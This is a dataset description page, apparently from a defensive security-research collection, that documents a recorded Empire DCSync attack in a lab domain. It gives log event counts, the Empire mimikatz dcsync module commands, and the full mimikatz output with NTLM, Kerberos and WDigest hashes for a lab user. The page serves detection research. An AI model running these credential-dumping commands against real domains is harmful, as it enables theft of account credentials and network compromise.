
# Empire DCSync

An adversary with DA permissions can use the active directory replication apis to pull the NTLM hash of any user in the network.

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## dataset

[empire_dcsync.tar.gz](./empire_dcsync.tar.gz)

## Nnetwork Environment

Shire

## Time Taken

2019-03-01174830

## About this file

| log_name                                 | task                                                   |   records count |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |            2249 |
| Windows PowerShell                       | Provider Lifecycle                                     |               8 |
| Windows PowerShell                       | Engine Lifecycle                                       |               1 |
| System                                   | Service State Event                                    |               9 |
| Security                                 | User Account Management                                |             160 |
| Security                                 | Filtering Platform Connection                          |             139 |
| Security                                 | Token Right Adjusted Events                            |             109 |
| Security                                 | Group Membership                                       |               6 |
| Security                                 | Logoff                                                 |               6 |
| Security                                 | Logon                                                  |               6 |
| Security                                 | Process Termination                                    |               4 |
| Security                                 | Special Logon                                          |               4 |
| Security                                 | Directory Service Access                               |               3 |
| Security                                 | File Share                                             |               3 |
| Security                                 | Other Object Access Events                             |               2 |
| Security                                 | Detailed File Share                                    |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             171 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |              88 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |              60 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |              39 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              20 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |               9 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               2 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |               2 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |            2325 |

## Empire Activity

```
usemodule credentials/mimikatz/dcsync
set domain shire.come
set user pgustavo
set dc HFDC01.shire.com
execute
```

```
  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:pgustavo /domain:shire.com /dc:HFDC01.shire.com
[DC] 'shire.com' will be the domain
[DC] 'HFDC01.shire.com' will be the DC server
[DC] 'pgustavo' will be the user account

Object RDN           : Pedro Gustavo

** SAM ACCOUNT **

SAM Username         : pgustavo
User Principal Name  : pgustavo@shire.com
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 1/14/2019 12:20:18 PM
Object Security ID   : S-1-5-21-2511471446-1103646877-3980648787-1107
Object Relative ID   : 1107

Credentials:
  Hash NTLM: 8ece039f32592670b45fc801e2a9157d
    ntlm- 0: 8ece039f32592670b45fc801e2a9157d
    lm  - 0: 15e09e2518ec09060eb8d5e3edca688b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 2a41aad084dd4b0f85542de96ec0d713

* Primary:Kerberos-Newer-Keys *
    Default Salt : SHIRE.COMpgustavo
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e9090c842bd528e456efc9912d417e0fba163d185cf11e803a75299c112ccf71
      aes128_hmac       (4096) : a45b256dcf19e05e7be415c8f8b74df3
      des_cbc_md5       (4096) : 40c4aef2ad988352

* Primary:Kerberos *
    Default Salt : SHIRE.COMpgustavo
    Credentials
      des_cbc_md5       : 40c4aef2ad988352

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  581eb1df6c6053b76a28a0dce36a8d6f
    02  7527b4ed5fdb8d86b3aae51bfa369d09
    03  1afb1ea2a11dacbaa9a7de3cdba90d2e
    04  581eb1df6c6053b76a28a0dce36a8d6f
    05  7527b4ed5fdb8d86b3aae51bfa369d09
    06  71ae329e68bc24b2c4aa77275ddbb153
    07  581eb1df6c6053b76a28a0dce36a8d6f
    08  beb04fe3623809f7bacf7e37109d4d21
    09  beb04fe3623809f7bacf7e37109d4d21
    10  dcbadc06749ae53ff0a5b12fea3117ca
    11  b4fba84ff02a3bf713d6de143ed08a04
    12  beb04fe3623809f7bacf7e37109d4d21
    13  f70d458543eeb1491b108783723d5250
    14  b4fba84ff02a3bf713d6de143ed08a04
    15  eb84c71ed69b32bc4def1ad8a50a3fec
    16  eb84c71ed69b32bc4def1ad8a50a3fec
    17  58e1d74ac34fc6fcc20d947e4bf5e3a9
    18  73eb0629757be77aa4a5a9c1a782658a
    19  60f5c9eefaacae631e229fd15f70ad92
    20  df090cdf058cdbda7bc78a57d2241a9a
    21  286470c2e82b1e8316b1a5198b9c72ec
    22  286470c2e82b1e8316b1a5198b9c72ec
    23  689bbadaae7f867861432adf3e385396
    24  91ff8d6376c52d90415254b0444b497b
    25  91ff8d6376c52d90415254b0444b497b
    26  bc4e42e3164f8e5d01f1b92fc75370ee
    27  535147dcae01ac8505ce306cdcbdfb97
    28  1aa7a460e6e4b2a1431c819b26626241
    29  6348ec8df577d8d1eb401cc5e29ee763
```